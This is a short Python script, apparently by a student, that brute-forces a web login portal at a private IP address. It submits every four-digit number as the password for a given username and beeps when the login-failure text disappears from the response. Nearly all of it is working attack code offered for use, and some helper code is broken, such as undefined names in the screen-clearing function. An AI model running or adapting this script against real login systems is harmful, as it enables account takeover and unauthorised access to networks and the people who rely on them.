#----------------------------TO CUSTOMIZE-------------------------------------
ip="172.24.16.1"
url = "http://172.24.16.1:8090/httpclient.html"
expression="The system could not log you on. Make sure your password is correct"
#------------------------------------------------------------------------------

#Creds Bro.
print(""" Made With Pride By $H@CKL3B0LT
 Made On D3M0N1K
 Student Of CSE,GIETU
 BATCH 2019-2023
 ps: I'm A Noob UwU
""")

#------------------For the Beep---------------
frequency = 2500  # Set Frequency To 2500 Hertz
duration = 1000  # Set Duration To 1000 ms == 1 second
#-----------------------------------------------------

#-----------For clearing the Screen-------------
def clear(): 
    if name == 'nt': 
        _ = system('cls') 
    else: 
        _ = system('clear') 
#------------------------------------------------------

import requests;
import sys;
from datetime import datetime
import os
import winsound

def trimmer(n):
    while(n!=int(n)):
        n=n*10
    return int(n)

def brute(username,password):
    ts=datetime.timestamp(datetime.now())
    ts=trimmer(ts) 
    data = {'mode':191,'username':username,'password':password,'a':ts, 'producttype':0}
    r = requests.post(url,data=data)
    s= r.text
    #clear()
    print("user: "+username+" key used: "+password)

    if (expression not in s):
        winsound.Beep(frequency, duration)
        print ("\n\t\tCorrect password Found: "+password)

        if(expression in s):
            data = {'mode':193,'username':username,'password':password,'a':datetime.timestamp(datetime.now())//1, 'producttype':0}
            r = requests.post(url,data=data)

        input("press enter to exit..")
        sys.exit()
        
def main():
    user,start,step,endin=sys.argv[1],int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4])
    if(len(sys.argv)==1):
        user=input ("enter the username: ")
        start=int(input("enter the start[input 0 here]:"))
        step=int(input("enter the step[enter 1]:"))
    #print("Checking Connection Please Wait.")
    #pinger=os.popen(f"ping {ip}").read()
    #if( "Ping request could not find host 172.24.16.. Please check the name and try again." in pinger):
    #    print("The network is not working. Check Your connection to the particular URL: 172.24.16.1:8090 ")
    #    input("press a key to exit")
    #    sys.exit()
    #print("Connection OK! ENGINE STARTED")
    while start<=9999 and start>=0:
        if(start==endin):
            exit()
        payload=str(start).zfill(4)
        brute(user,payload) 
        start+=step
                   
if __name__ == '__main__':
	main()
